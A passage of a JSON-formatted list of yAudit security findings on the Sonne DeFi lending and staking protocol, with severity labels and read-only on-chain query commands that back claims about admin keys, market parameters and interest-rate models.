in Aave in November 2022, so that governance action can be taken to adjust the protocol parameters as needed. The combination of the above factors and the lack of any borrow cap means that the risk of a bank run on Sonne is higher than protocols with less risky parameters. There are at least two different ways that a bank run could happen. One is the case where a market is at a high utilization rate, say near 90% utilization like the soOP market currently is. This means that if a whale who has deposited into the soOP pool plans to withdraw 10% of the total supplied assets, the soOP market will reach 100% utilization ratio. When a market is at 100% utilization ratio, there are no more assets that can be withdrawn from the market, because the market physically does not hold any of these assets. This means that some users will not be able to withdraw their assets in this case. The second scenario where a bank run could happen is if bad debt accumulates in the market. The early users to withdraw will be able to withdraw their funds without any problem, but the late depositors will not. The result is that the late or last users to withdraw their assets will receive 100% of the impact of bad debt accumulation.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. EOA admins control staking rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The address 0xFb59Ce8986943163F14C590755b29dB2998F2322 is the owner of uSONNE and sSONNE contracts and it is an EOA. This can be confirmed by opening etherscan or querying the contracts directly: cast call 0x41279e29586eb20f9a4f65e031af09fced171166 \"owner()(address)\" --rpc-url https://mainnet.optimism.io cast call 0xdc05d85069dc4aba65954008ff99f2d73ff12618 \"owner()(address)\" --rpc-url https://mainnet.optimism.io This same EOA that is the owner of uSONNE and sSONNE is the admin address for Sonne LiquidityGenerator, which was out of scope of this review. Another role of this EOA is to deploy contracts, including the proxy and logic contract for the Unitroller in the Sonne lending protocol. Another EOA address, 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3, plays a key role in manually transferring rewards from Velodrome to the uSONNE and sSONNE contracts by calling addReward(). The same EOA is stored as reservesManager in Sonne LiquidityGenerator, which was a contract outside the scope of this review. cast call 0x17063Ad4e83B0aBA4ca0F3fC3a9794E807A00ED7 \"reservesManager()(address)\" --rpc-url https://mainnet.optimism.io EOAs should not play key roles in value transfer operations in a DeFi protocol. There is no way to trust that the EOA is going to act as expected, and without context there is no way to determine that this EOA will not end up rugging depositors of their rewards. Fortunately, in the case of uSONNE and sSONNE, the 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3 EOA does not have access to the underlying SONNE tokens deposited into the staking contracts, and only has control over future rewards that SONNE generates. But using an EOA for key operations increases the risk of loss of funds due to private key exposure. A multisig would mitigate the risk of this single point of failure.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. EOA swapped staked token rewards to ETH for gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The EOA 0x201ECB1C439F92aFd5df5d399e195F73b01bB0F3 plays a key role in manually transferring rewards from Velodrome to the uSONNE and sSONNE contracts by calling addReward(). This same EOA converted some rewards to ETH to pay for the gas consumed in the EOA transactions. This process of taking some staking rewards for ETH is not documented anywhere. In fact, this process contradicts the staking documentation which states that users will get 100% of staking rewards: Stakers will get 80% of the protocol revenue and 80% of VELO rewards for the first 3 months. After team tokens start to get unlocked, stakers will start to get 100% of the protocol revenue. Because the EOA is taking some of these rewards for gas, users are not getting 100% of staking rewards. In fact, there is no explanation for how many reward tokens are spent on gas, so users cannot know what percentage of staking rewards they receive. At the time of this review, 27% of total SONNE is staked in uSONNE or sSONNE contracts, which means over 25% of all SONNE tokens are indirectly impacted by this finding.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Unclear protection against Hundred Finance attack vector",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The Hundred Finance hack was largely caused by an empty WBTC market. The other requirements for this attack vector are that the market has a non-zero collateral factor (to allow borrowing against this token as collateral) and a totalSupply of the cToken of zero. The result of this is a scenario similar to ERC4626 share price manipulation for the first deposit, with a large donation to skew share price. There is no evidence that Sonne has a clear and consistent mitigation to this attack vector. One of the more recently created Sonne markets, sowstETH, had a 1 day period between the creation of the market on February 19 and the first deposit on February 20. The same pattern is seen in the soLUSD and soWBTC markets, with the soLUSD market created on February 2 and the first deposit on February 3 and the soWBTC market created on December 3 and the first deposit on December 4. The markets were initialized with a non-zero collateral factor, but the collateral factor was raised above 0 before the first deposit in all three of these cases, meaning there was a point in time when the protocol was likely vulnerable to the same attack as Hundred Finance. For example: soWBTC market is deployed at 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D. soWBTC market was deployed in block 45086893. Collateral factor in this block and soon after is zero, which is good, because assets deposited immediately cannot be borrowed against. cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --block 45086893 --rpc-url https://mainnet.optimism.io First deposit into soWBTC happened in block 45448745. But in the block before it, we can see the collateralization factor was already non-zero and was set to 70%: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --block 45448744 --rpc-url https://mainnet.optimism.io For further confirmation that this is the correct block to examine, the blockchain data confirms that the totalSupply of soWBTC in the block before the first deposit was zero, and then was non-zero in the following block. Before: cast call 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D \"totalSupply()\" --block 45448744 --rpc-url https://mainnet.optimism.io After: cast call 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D \"totalSupply()\" --block 45448745 --rpc-url https://mainnet.optimism.io In fact, after doing a search to find when the collateralization factor changed, it is revealed that the collateralization factor was changed in block 45448654. The before and after can be compared with: Before: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --rpc-url https://mainnet.optimism.io --block 45448653 After: cast call 0x60CF091cD3f50420d50fD7f707414d0DF4751C58 \"markets(address)(bool,uint256,bool)\" 0x33865E09A572d4F1CC4d75Afc9ABcc5D3d4d867D --rpc-url https://mainnet.optimism.io --block 45448654 There is no script in the deploy directory for deploying a new market, which is another data point that there is no consistent documented process to deploying new markets in a way that mitigates this attack vector.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. No sequencer uptime check before querying Chainlink data on L2",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "If a transaction is created on an L2 rollup while the sequencer is down, the transaction would be added to a queue. Because the transaction timestamp is the time when the transaction was queued, by the time the sequencer comes back online to process the queue, the price data could be outdated.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Poor choice of interest rate models in Sonne",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Every cToken has a separate interest rate model contract. This is true even when the cTokens have the exact same interest rate borrowing and lending curves. Some examples are shown below. | cToken | Interest Rate Model Contract | | ------ | ------------------------------------------ | | cUSDC | 0xD8EC56013EA119E7181d231E5048f90fBbe753c0 | | cDAI | 0xFB564da37B41b2F6B6EDcc3e56FbF523bD9F2012 | | cETH | 0xF9583618169920c544Ec89795a346F487cB5a227 | In contrast, Sonne is using the same interest rate model contract for many different tokens. The results for all soTokens are shown below. The interest rate model curve for WETH and OP is the same as the interest rate model for the stablecoins that aim to maintain a peg to USD. | soToken | Interest Rate Model Contract | | -------- | ------------------------------------------ | | soWETH | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soDAI | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soUSDC | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soUSDT | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soOP | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soSUSD | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soLUSD | 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6 | | soWBTC | 0x3F6fB832279AC7db0B4F92b79cBB8Df03702631e | | sowstETH | 0x3F6fB832279AC7db0B4F92b79cBB8Df03702631e | | soSNX | 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E | One of the side effects of the Sonne interest rate model choices is that the rate curve is less steep for tokens with more volatile prices. In order to minimize the risk of bad debt, there should be incentives to avoid excessive borrowing of risky assets. Specifically, WETH and OP are using the same interest rate model curve as stablecoins that should remain pegged to USD. Using a curve with less slope for volatile assets means that borrowing that asset is less expensive, and making it cheaper to borrow volatile assets increases the risk of bad debt accumulating. The table below compares Compound cToken parameters to Sonne soTokens. | Token | multiplierPerSecond | jumpMultiplierPerSecond | baseRatePerSecond | | ------ | ------------------- | ----------------------- | ----------------- | | cUSDC | 1585489599 | 34563673262 | 0 | | soUSDC | 1981861998 | 43283866057 | 0 | | cETH | 7134703196 | 1553779807204 | 634195839 | | soWETH | 1981861998 | 43283866057 | 0 | | cwBTC | 7134703196 | 31709791983 | 634195839 | | sowBTC | 8918378995 | 39637239979 | 634195839 | Not surprisingly, the largest discrepancy is in WETH, because as mentioned above, soWETH is using the same slope parameters as stablecoins. The soWETH multiplierPerSecond slope is 27.7% of the slope value that Compound uses, and the jumpMultiplierPerSecond slope is only 2.8% of the value chosen by Compound. Or for a different comparison, the cWETH slope after the kink is 218 times the slope before the kink. For soWETH, the slope only increases 22 times after the kink. This means that the Compound Finance market is providing a strong disincentive to borrow beyond the kink for the WETH market than Sonne, most likely to reduce the risk of bad debt. If Compound v2 had a market for OP tokens, the same result would almost certainly exist because soOP is using the same interest rate model as stablecoins, just like soWETH. Finally, while it is true that _setInterestRateModel() in the cToken contract can be used to set a new interest rate model contract, the admin that is able to trigger this change is the Timelock Controller at 0x37ff10390f22fabdc2137e428a6e6965960d60b6, which means that a minimum 48 hour delay must take place before the change can be implemented.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Sonne interest rate model math error",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The only non-stablecoin asset in Sonne that is found in Compound Finance with an interest rate model that is almost the same is WBTC. However, Sonne does not properly imitate the WBTC curve from Compound Finance. Consider these example values for a utilization value of 80%. cash: 20000000000000 borrows: 80000000000000 reserves: 0 reserveMantissa: 200000000000000000 Entering these values into getBorrowRate and getSupplyRate in etherscan for intrest rate contract defined in cWBTC, the resulting values are 95129375951 and 60882800608 respectively. After multiplying this rate-per-block by the blocks-per-year value of 2628000, we find the borrow rate is 25% and the supply rate is 16%. Meanwhile, entering these values into etherscan for soWBTC returns 7768899035 for getBorrowRate and 4972095382 for getSupplyRate. After multiplying this rate-per-second by the seconds-per-year value of 31536000, we find the borrow rate is 24.5% and the supply rate is 15.7%. This error may be partially caused by the baseRatePerBlock value chosen for soWBTC. The Compound value for baseRatePerBlock is 9512937595 and the soWBTC value is 9512937595 / 15 = 634195839. However, a soWBTC value assuming 12 second blocks instead of 15 second blocks may improve alignment to Compound Finance's cWBTC curve. Be aware that the Compound UI is inaccurate for the cWBTC curve as detailed in this open issue for the Compound Finance frontend. When hovering over the 80% utilization in the Compound Finance UI, the UI suggests a borrow rate of 24.5% and a supply rate of 18.13%. Therefore, the UI curves do not match the on-chain cWBTC deployment. Additionally, Sonne uses the same value for constant borrowRateMaxMantissa as Compound but in the comment it is stated that borrow rate value is applied per block. This means that the value should be 12 times lower on Optimism. Another Compound fork on Optimism, Hundred Finance, uses the correct value 0.00004e16.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. No Borrow Caps set",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "In November 2022, a widely publicized CRV short selling event aimed at liquidating certain Aave borrowers. Compound Finance took action after this event and made significant changes to their borrow cap approach (1, 2). The result is that Compound Finance has a borrow cap set on every market except for USDC, DAI, and USDT. The borrow caps that are set on markets are set to values that are less than the assets supplied. This means that even though the interest rate curve for borrowing could work up to 100% supplied assets, the borrow cap keeps the maximum amount that can be borrowed significantly lower. Aave also has non-zero borrow caps, although Aave v3 on mainnet Ethereum has higher borrow caps for many assets relative to the amount deposited. Although the explanation in the proposal for reducing the borrow caps was \"insolvency risk from liquidation cascades\" and \"risk of high utilization\", setting proper borrow cap values may also provide some protection in cases like the Venus protocol LUNA fallout (Venus is a Compound fork), because a borrow cap below the value of assets deposited to the protocol would prevent all the assets from the protocol from being borrowed if a Chainlink oracle failed.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Reserves stored in Sonne adds currency risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "When comparing Sonne and Compound Finance on-chain data, it is obvious that there is a large difference in the amount of reserves stored in each protocol. In Compound's cUSDC market, the value of totalReserves is over $13 million. These tokens are owned and stored by the cUSDC contract. In comparison, the Sonne soUSDC market has a totalReserves value of under $1000. The reason that soUSDC has such a low totalReserves value is because the reserves are periodically withdrawn by the admin in transactions such as 0xed3ee0eb900779a6c82d474fc12697bb6cc55372960c775a22c42e4931a7d922. The value flow of the reserves in Sonne is as follows: Reserve tokens accumulate in soToken market contract Reserve tokens are withdrawn by EOA admin EOA admin swaps reserve tokens for USDC using Velodrome pool (potentially has 2% slippage) EOA admin swaps USDC for SONNE tokens (potentially 2% slippage, plus the market price is moved because the USDC/Sonne pool has low liquidity) EOA deposits SONNE tokens into sSONNE, where it sits in the sSONNE contract and collect Velodrome rewards At a minimum, storing the value of the reserves tokens in SONNE introduces currency risk. If bad debt accumulates in a token that is not correlated or pegged to SONNE token value, there is a risk that the value of the reserves could drop in USD terms while the bad debt amount increases in USD terms, making it impossible for the Sonne multisig or admins to pay off the debt. For a specific example, if Sonne collects $1000 in bad debt denominated in USDC and has $5000 of reserves value that was converted to SONNE, then if the SONNE token drops in price more than 80% compared to when the USDC was converted to SONNE, the protocol will not have enough reserves to pay off the bad debt. It is generally a good practice for DAOs or protocols to diversify their treasury holdings. If Sonne holds the original underlying assets instead of converting these assets to Sonne, it demonstrates that Sonne holds real value uncorrelated to the SONNE token. The current approach converts these underlying into SONNE with the goal of propping up the SONNE token price by funding the Velodrome USDC/SONNE market, but it reduces the actual value owned by SONNE in non-SONNE tokens. A secondary risk that is introduced with the swapping of reserve funds is the total losses due to the swaps. Sonne may be losing 5% of total reserve value by swapping the underlying reserve tokens into SONNE because the default slippage on Velodrome is 2%. Two swaps in Velodrome means around 4% of value can be lost, and as highlighted in a separate low findings, the SONNE/USDC market has low liquidity and large swaps can move the market price. If SONNE tokens need to converted back to other tokens to pay off debt, then the overall losses due to slippage could be 7% or higher. This means that the reserves collected by the protocol over time does not match the actual value that could pay off bad debt.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. No Chainlink staleness check in _getLatestPrice()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The Chainlink latestRoundData() function returns price data along with the roundId and timestamp of the data. If the data is stale, it should be discarded. Otherwise the protocol will trust outdated data that could lead to a loss of value from using an inaccurate exchange rate. Chainlink docs recommend to check the roundId and timestamp values that the oracle returns, as shown in other security report findings here and here.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. User can accidentally postpone staking release time",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "If burn() is called with amount zero, no state variable changes should be made. Moving all state variable changes inside the if statement will make sure that less gas is spent on the zero amount case, and will also prevent a user from accidentally postponing their release time. function burn(uint256 amount) public { if (amount > 0) { _burn(msg.sender, amount); Withdrawal storage withdrawal_ = withdrawal[msg.sender]; withdrawal_.amount = withdrawal_.amount + amount; withdrawal_.releaseTime = block.timestamp + withdrawalPendingTime; } }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Small SONNE/USDC liquidity leaves potential for large price shifts",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Let us examine a specific example of the price change before and after this tx involving the EOA that performs swaps of the Sonne staking rewards. Approximately $14500 of USDC was swapped for SONNE. Check the price of SONNE in the pool before the swap (block 94817489) cast call 0xc899c4d73ed8df2ead1543ab915888b0bf7d57a2 \"getAmountOut(uint256,address)(uint256)\" \"10000000000000000000\" \"0x1DB2466d9F5e10D7090E7152B68d62703a2245F0\" --block 94817489 --rpc-url OPTIMISM_RPC 1 SONNE = 1516372 USDC Check the price of SONNE in the pool after the swap (block 94817490) cast call 0xc899c4d73ed8df2ead1543ab915888b0bf7d57a2 \"getAmountOut(uint256,address)(uint256)\" \"10000000000000000000\" \"0x1DB2466d9F5e10D7090E7152B68d62703a2245F0\" --block 94817490 --rpc-url OPTIMISM_RPC 1 SONNE = 1561887 USD Calculate the price change from this swap (1561887 - 1516372) / 1561887 ~ 3% This price impact is even displayed in the Velodrome UI when it exceeds a certain threshold.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Incorrect totalSupply in Comp for on-chain voting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Excluding the 18 decimals of the SONNE token, 100 million SONNE are minted when the token is deployed. Contrast this to only 10 million COMP total supply value. The values can be queried with etherscan: COMP totalSupply: https://etherscan.io/token/0xc00e94cb662c3520282e6f5717214004a7f26888#readContract#F14 SONNE totalSupply: https://optimistic.etherscan.io/address/0x1DB2466d9F5e10D7090E7152B68d62703a2245F0#readContract#F6 The 10 million total supply value is hardcoded in Comp.sol and was not updated to the 100 million value that should be used in Sonne. This means that on-chain voting could be problematic if Sonne uses Comp.sol for this reason. The Sonne.sol contract clearly shows a total supply of 100 million Sonne.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. SUSD and LUSD Chainlink price feeds are not standardized verified feeds",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The lowest risk and highest quality tier for Chainlink oracles are verified feeds. Monitored Chainlink feeds are the second highest quality tier of oracles, but they carry additional risk and are still under review. Because a common weakness for Compound forks is oracle manipulation leading to the draining of many markets, the Sonne protocol is only as robust as its weakest oracle. Using Chainlink oracles that introduce extra risk is problematic. Screenshots of the Chainlink documentation at the time of the review is below. Chainlink documentation about data feed quality The LUSD data feed is a monitored feed The SUSD data feed is a monitored feed",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Functions calls to uninitialized address",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Because the address is not initialized, the attacker could deploy a harmful contract with the same function calls but with harmful logic. Also, function calls should be done using a contract interface.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. High default slippage may lose value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The velodrome frontend has an unusually high 2% slippage setting. The slippage in AMMs like Uniswap is automatically set in a dynamic way. Based on conversations with the development team, the default slippage has been used in the past. While Optimism is not at risk of MEV right now, a high slippage tolerance can still lose value if the token weights in the Velodrome pool do not favor the direction of the swap.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Remove SafeMath import",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Solidity 0.8.0 introduced a breaking change to implement overflow and underflow protection. The original code from Tarot Finance was using solidity 0.6.6 which did not have this feature. This means the SafeMath imports can be removed to save gas on deployment for Distributor.sol.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Cache variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Obtaining the length of an array consumes gas, so storing this value in a temporary memory variable when the value is needed more than once saves gas, like in claimAll().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Replace totalShares and shares[]",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Etherscan shows that the totalShares and totalSupply values for uSONNE and sSONNE are the same. Reasoning about the totalShares math in _editRecipientInternal() reaches the conclusion that these values should remain the same. _editRecipientInternal() increases totalShares when uSONNE or sSONNE is minted, decreases totalShares when uSONNE or sSONNE is burned, and doesn't modify totalShares when uSONNE or sSONNE is transferred between non-zero addresses. The same applies to shares[]. In fact, because _editRecipientInternal() is always called with shares_ set to balanceOf(account), the shares[] mapping is duplicating exactly what _balances[] already stores. The only reason that Tarot Finance has a totalShares state variable and stores the shares count in recipient.shares (the equivalent of shares[]) in its Distributor contract (the inspiration for Sonne's Distributor) is because the Tarot Finance contract is not an ERC20 and does not have a totalSupply variable or _balances mapping.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Remove duplicate line of code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "This line of claimInternal() can be removed because updateCredit() performs the same check and updateCredit() is called in the 2nd line of claimInternal().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Consistently apply unchecked for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "This line of sub() and this line of div() can be unchecked. This would follow the approach applied in trySub() and tryDiv() in the OZ SafeMath library for solidity 0.8.X and the approach in add() and mul() of the Sonne SafeMath library.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Require statements are found throughout the protocol, but especially in Comptroller.sol, CToken.sol, and ExternalRewardDistributor.sol. Replacing require with solidity errors can provide gas savings.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Borrow gas optimizations from Compound",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "notifyBorrowIndexInternal() and notifyBorrowIndexInternal() can benefit from gas optimizations by: caching state variable storage values retrieved more than once removing duplicate > or < checks The specific differences compared to Compound are: notifyBorrowIndexInternal() checks if blockNumber > marketState.borrowBlock and then performs the math blockNumber - marketState.borrowBlock with SafeMath. The subtraction can be unchecked to save gas, or the logic from Compound where the subtraction is performed before the if statement can be used. Two state variable values are queried twice, marketState.supplyBlock and marketState.supplySpeed. These values can be cached to save gas in the case where they are queried twice. Compound only caches supplySpeed because the supply block is queried only once because of the previous optimization (subtracting the values before the if statement).",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Initialize variable only if needed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Variable marketBorrowIndex is initialized before the if statement but its only used inside the second if block.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Undocumented market creation process",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "One of the top causes of Compound fork hacks is reentrancy bugs, because Compound does not follow the checks-effects-interaction pattern. This means that if a Sonne market is created with a token that allows reentrancy, such as an ERC777 token, this can put the protocol funds at risk. Compound has a clear process for adding new markets that includes creating a public governance proposal. Compound is aware of this risk but has chosen not to fix it in their code.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Distribution.sol uses magic number 2**160 in several places. Consider replacing these magic numbers with a constant internal variable. This will not change gas consumption.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Remove unused code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Distribution.sol has commented code that is not used, L105 and L116. Removing it will improve readability.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Add events to Distributor.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Add events for changing the list of rewards tokens tokens. One for each of the functions addToken() and removeToken() in the file Distribution.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Add event to setWithdrawalPendingTime() and burn()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "It can be helpful to add events for any action that modifies state variables to make it easier to trace when the value change happened and to add monitoring of such changes more easily.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Remove unused files",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Removing unused files will improve readability.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Outsourcing staking yield generation increases risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Sonne heavily relies on Velodrome for the Sonne staking protocol. Unlike some other staking protocols, Sonne does not directly provide rewards to stakers but instead outsources the reward generation to Velodrome. Relying on a protocol that does not have an active bug bounty program, has not gotten an audit from a high quality firm, is forked from Solidly which had several known bugs, and has a top 30 TVL introduces risk to the funds that Sonne users stake. Because Velodrome is likely one of the highest TVL protocols without an active bug bounty program, they likely are a target for bad actors while they do not have much incentive for white hat hackers to look at their code.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Use consistent naming for internal functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "_editRecipientInternal() and claimInternal() are defined in Distributor.sol. Consider renaming claimInternal() to _claimInternal() for consistency to avoid confusion about the context of certain functions.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Remove redundant import",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Distributor.sol imports SafeToken.sol and StakedDistributor.sol also imports SafeToken.sol. The SafeToken.sol import in StakedDistributor.sol can be removed because StakedDistributor.sol already imports Distributor.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Missing NatSpec",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "NatSpec is a good way to explain your code to other developers modifying or forking a project, to users who want to understand what the contracts are doing, and to auditors who are trying to determine whether the contract logic is implemented properly. The contracts of staking-protocol have a severe lack of detailed NatSpec comments which makes it harder to understand the developer's intentions.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Simplify claimInternal() arguments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "claimInternal() takes two function arguments of type address. But this function is an internal function, and the only two places where it is called (1, 2) set the account argument to msg.sender. This means claimInternal() does not require this argument because account can be replaced with msg.sender.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Document the end of rewards accumulation when burn() is called",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Every SONNE depositor into uSONNE or sSONNE must leave their tokens in the contract for one week without reward accumulation. This is not documented in the Sonne staking docs, but should be. Otherwise if the documentation does not properly describe this behavior, users may not expect the code to be implemented in the way that it is.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Distributor function removeToken() can lose funds",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Removing reward token from the list of reward tokens will result in locked reward tokens which cannot be collected by users or contract owner.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Unnecessary code from Compound",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Compound proposal 65 is related to fixing a past issue that Compound had related to distributing rewards early. Sonne does not need to fix such an issue and therefore this function is unnecessary outside of Compound. liquidateBorrowVerify() is also unnecessary. Remove the functions without purpose or implement if needed: sizeVerify(), transferVerify(), mintVerify(), borrowVerify(), repayBorrowVerify(), liquidateBorrowVerify(). Also, remove errors that are not used: TransferTooMuch and LiquidateRepayBorrowFreshFailed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Make public functions external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Declare these public functions as external because they do not need to be called internally: getSupplyRate() in JumpRateModelV4.sol isOwner() in Ownable.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Use standard implementation approach in SafeMath.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
